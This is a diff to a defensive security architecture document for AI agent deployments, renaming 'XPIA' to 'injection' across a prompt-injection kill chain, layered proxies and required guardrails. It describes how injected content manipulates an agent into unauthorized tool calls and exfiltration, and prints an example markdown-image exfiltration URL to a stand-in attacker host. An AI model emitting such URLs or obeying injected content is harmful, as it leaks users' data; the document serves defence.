@@ -35,20 +35,20 @@ The threat landscape is actively evolving. The framework acknowledges that novel
 | DNS | Covert exfiltration | Traditional |
 | Credentials at rest | Key theft | Traditional |
 
-### The XPIA Kill Chain
+### Novel Threat Kill Chain
 
-XPIA is the primary novel threat. The architecture places controls at every stage of the attack sequence:
+Injection attacks — where an attacker embeds instructions in content the agent will consume — are the canonical novel threat. The architecture places controls at every stage of the attack sequence:
 
 ```
 1. CONTENT POISONING → Egress proxy domain denylist
 2. AGENT INGESTION   → Egress logging, gateway file audit
-3. CONTEXT INJECTION → Pre-call XPIA detection, optional DLP
-4. LLM MANIPULATION  → Post-call XPIA detection
+3. CONTEXT INJECTION → Pre-call injection detection, optional DLP
+4. LLM MANIPULATION  → Post-call injection detection
 5. ACTION EXECUTION  → Tool permission guard, gateway policy
 6. EXFILTRATION      → Egress proxy, network isolation
 ```
 
-No single layer is expected to catch every attack. The defense succeeds when the combined layers make the cost of a successful end-to-end attack prohibitively high. See [THREATS.md § XPIA](THREATS.md#cross-prompt-injection-attack-xpia) for the full analysis.
+No single layer is expected to catch every attack. The defense succeeds when the combined layers make the cost of a successful end-to-end attack prohibitively high. See [THREATS.md](THREATS.md) for the full threat analysis, including identity poisoning, MCP tampering, behavioral drift, and multi-agent attack chains.
 
 ### Trust Tiers
 
@@ -97,7 +97,7 @@ Every ASK-conforming deployment must implement seven distinct enforcement functi
 
 1. **Network isolation** — the agent has no direct internet access; all outbound traffic is forced through mediation
 2. **Egress mediation** — all agent web traffic passes through a policy-controlled proxy that enforces domain restrictions, rate limits, and size limits
-3. **LLM mediation** — all agent LLM calls pass through a proxy that enforces scoped API keys, XPIA guardrails, spend caps, and model routing
+3. **LLM mediation** — all agent LLM calls pass through a proxy that enforces scoped API keys, injection guardrails, spend caps, and model routing
 4. **Per-agent HTTP policy enforcement** — each agent has a dedicated enforcement point that mediates all its HTTP traffic, performs credential swap, and logs every request (see "The Enforcer")
 5. **Workspace hardening** — the agent's execution environment restricts filesystem writes, drops unnecessary capabilities, runs as a non-root principal, and enforces resource limits
 6. **Execution-level mediation** — fine-grained policy enforcement on file operations, command execution, and process control within the agent's workspace (see "The Runtime Gateway")
@@ -116,7 +116,7 @@ Layer 2: Egress Proxy
   All agent web traffic flows through here
          ↓
 Layer 3: LLM Proxy
-  XPIA guardrails, scoped API keys, spend caps, model routing
+  Injection guardrails, scoped API keys, spend caps, model routing
   All agent LLM calls flow through here
          ↓
 Layer 4: Enforcer (per-agent HTTP policy proxy)
@@ -171,7 +171,7 @@ The following diagram illustrates one valid topology for a single-agent deployme
 │  │                                                            │   │
 │  │   Egress proxy              LLM proxy         Database     │   │
 │  │   Domain denylist           Scoped API keys   (agents      │   │
-│  │   Rate limits               XPIA guardrails    cannot      │   │
+│  │   Rate limits               Injection guardrails cannot     │   │
 │  │   Size limits               Spend caps          reach)     │   │
 │  │   TLS passthrough           Model routing                  │   │
 │  │   :3128                     :4000                          │   │
@@ -456,15 +456,15 @@ This satisfies Tenet 1 (constraints are external and inviolable — the agent ca
 
 This section defines required guardrail capabilities — what an implementation must provide — not specific detection techniques or deployment patterns.
 
-Guardrails scan content at two points: **pre_call** (scanning input before it reaches the LLM) and **post_call** (scanning responses before they return to the agent). The pre_call/post_call dual mode is non-negotiable for agents. Pre_call catches injection in user-facing input. Post_call catches the XPIA kill chain: poisoned tool output → manipulated LLM response → exfiltration attempt on the way back out.
+Guardrails scan content at two points: **pre_call** (scanning input before it reaches the LLM) and **post_call** (scanning responses before they return to the agent). The pre_call/post_call dual mode is non-negotiable for agents. Pre_call catches injection in user-facing input and tool responses before they reach the LLM. Post_call catches the full injection kill chain — poisoned content → manipulated LLM response → exfiltration or unauthorized action on the way back out — as well as credential leakage, policy violations in generated content, and unauthorized tool calls.
 
 ### Required Guardrail Capabilities
 
 An ASK-conforming implementation must provide three guardrail capabilities. The specific detection techniques (regex, ML, heuristic) and deployment patterns are implementation-dependent — the capabilities are the requirement:
 
-**XPIA Detection** (pre_call + post_call). Scans input before it reaches the LLM (pre_call) and scans LLM responses before they return to the agent (post_call). Must cover common injection vectors: direct injection phrases, HTML/markdown-based exfiltration, role override attempts, and encoded payloads. Implementations may use regex patterns, ML models, heuristic detectors, or a combination.
+**Injection & Content Threat Detection** (pre_call + post_call). Scans input before it reaches the LLM (pre_call) and scans LLM responses before they return to the agent (post_call). Must cover common injection vectors: direct injection phrases, HTML/markdown-based exfiltration, role override attempts, and encoded payloads. Implementations may use regex patterns, ML models, heuristic detectors, or a combination.
 
-**Tool Permission Guard** (LLM tool call allowlist). Enforces a whitelist of which tools the agent is allowed to call via the LLM, and can restrict tool arguments to approved patterns. If XPIA convinces the LLM to call an unauthorized tool, the guard blocks it. Default configuration should be deny-all.
+**Tool Permission Guard** (LLM tool call allowlist). Enforces a whitelist of which tools the agent is allowed to call via the LLM, and can restrict tool arguments to approved patterns. Blocks unauthorized tool calls regardless of cause — injection, manipulation, or behavioral drift. Default configuration should be deny-all.
 
 **Gateway MCP Tool Policy** (MCP server/tool allowlist). Enforces per-server, per-tool allowlists on MCP tool calls at the process level (gateway sidecar). Where the tool permission guard mediates tool calls in LLM responses at the proxy layer, the MCP policy mediates MCP tool calls between the agent process and MCP server subprocesses. This is necessary because a compromised agent could invoke MCP tools without going through the LLM at all, bypassing the proxy-level guard entirely.
 
@@ -472,11 +472,11 @@ An ASK-conforming implementation must provide three guardrail capabilities. The 
 
 ```
 Input (user message, tool output, web content)
-  ├─► [pre_call]  XPIA detection          → scan for injection patterns
+  ├─► [pre_call]  Injection detection      → scan for injection patterns
   ├─► [pre_call]  (optional layers)        → ML detection, PII masking, URL scanning
   ▼
 LLM Call (provider API via LLM proxy)
-  ├─► [post_call] XPIA detection          → scan LLM responses
+  ├─► [post_call] Injection detection      → scan LLM responses
   ├─► [post_call] Tool Permission Guard   → validate tool calls are authorized
   ├─► [post_call] (optional layers)        → ML detection, PII masking, URL scanning
   ▼
@@ -488,9 +488,9 @@ Response returned to agent
 
 The architecture supports additional guardrail layers beyond the required capabilities. These extend coverage but are not required for framework conformance:
 
-**ML-based XPIA detection.** ML models that differentiate direct injection from indirect prompt injection in tool outputs. Returns confidence scores rather than binary pattern matches. Catches sophisticated attacks that evade regex.
+**ML-based injection detection.** ML models that differentiate direct injection from indirect prompt injection in tool outputs. Returns confidence scores rather than binary pattern matches. Catches sophisticated attacks that evade regex.
 
-**Malicious URL/domain scanning.** Detects malicious URLs in responses before they reach the agent — critical for catching XPIA exfiltration via rendered markdown images (`![](https://attacker.com/steal?data=...)`).
+**Malicious URL/domain scanning.** Detects malicious URLs in responses before they reach the agent — critical for catching exfiltration via rendered markdown images (`![](https://attacker.com/steal?data=...)`) and other URL-based attack vectors.
 
 **PII masking.** NLP-based detection and masking of personally identifiable information. Pre_call masks PII before the LLM sees it. Post_call masks PII the LLM generated. Can run locally with no external API calls.
 
@@ -498,7 +498,7 @@ The architecture supports additional guardrail layers beyond the required capabi
 
 ### Defense Posture
 
-The three required capabilities (XPIA detection + tool permission + MCP policy) provide the minimum guardrail coverage. Simple implementations (regex-based detection, static allowlists) can work in fully network-isolated environments with zero external dependencies. Adding ML-based layers extends coverage to novel attack patterns — but may require external service access or commercial accounts. The architecture is designed so that layers stack independently: adding or removing a layer doesn't affect the others.
+The three required capabilities (injection detection + tool permission + MCP policy) provide the minimum guardrail coverage. Simple implementations (regex-based detection, static allowlists) can work in fully network-isolated environments with zero external dependencies. Adding ML-based layers extends coverage to novel attack patterns — but may require external service access or commercial accounts. The architecture is designed so that layers stack independently: adding or removing a layer doesn't affect the others.
 
 ---
 
